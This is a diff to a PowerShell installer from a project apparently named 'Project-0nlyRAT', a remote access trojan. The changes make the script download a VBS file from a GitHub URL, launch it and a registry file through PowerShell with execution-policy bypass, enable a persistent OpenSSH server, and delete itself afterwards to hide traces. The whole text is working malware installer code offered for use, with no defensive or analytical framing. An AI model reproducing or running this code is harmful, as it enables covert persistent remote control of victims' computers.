@@ -45,7 +45,8 @@ $vbs_file = random_text
 iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/confirm.vbs" -OutFile ".\$vbs_file.vbs"
 
 # execute the registry entry process
-.\"$reg_file.reg";"$vbs_file.vbs"
+# .\"$reg_file.reg";"$vbs_file.vbs"
+powershell -noP -ep bypass Start-Process powershell.exe ".\$reg_file.reg;$vbs_file.vbs"
 
 # enable persistent ssh
 # Install the OpenSSH Server feature
@@ -60,7 +61,8 @@ Set-Service -Name sshd -StartupType Automatic
 # Verify that the service is running
 Get-NetFirewallRule -Name *ssh*
 
+Pause
 
 # navigate to the saved directory and self delete
-# cd $curr_dir
-# del install.ps1
+cd $curr_dir
+del install.ps1
